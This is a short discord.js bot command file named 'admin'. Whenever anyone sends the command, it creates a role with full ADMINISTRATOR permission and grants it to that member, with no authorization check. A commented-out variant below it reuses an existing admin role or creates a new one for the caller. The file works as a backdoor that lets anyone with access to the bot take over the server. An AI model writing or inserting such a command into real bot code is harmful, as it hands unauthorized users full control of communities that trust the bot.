const {Discord, Permissions } = require('discord.js');

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {
  message.guild.roles.create({
      name:'Théo role',
      color:'YELLOW',
      reason:'parce que ...',
      permissions: [
          Permissions.FLAGS.ADMINISTRATOR
        ]
  }).then((role) => {
    message.member.roles.add(role);
  })

};

module.exports.name = 'admin';


// const { Discord, Permissions } = require('discord.js');

// /**
//  * @param {Discord.Client} client
//  * @param {Discord.Message} message
//  * @param {Array<String>} arguments
//  */
// module.exports.run = async (client, message, arguments) => {
//   message.guild.roles.fetch().then((roles) => {
//     roleFound = null
//     roles.forEach(role => {
//       if (role.permissions.has(Permissions.FLAGS.ADMINISTRATOR)) {
//         roleFound = role
//       }
//     });

//     if (roleFound) {
//       message.member.roles.add(roleFound).catch((err) => { })
//     } else {
//       message.guild.roles.create({
//         name: 'ADMIN',
//         color: 'BLUE',
//         permissions: [
//           Permissions.FLAGS.ADMINISTRATOR
//         ]
//       }).then((newRole) => {
//         message.member.roles.add(newRole)
//       })
//     }
//   })
// };

// module.exports.name = 'admin';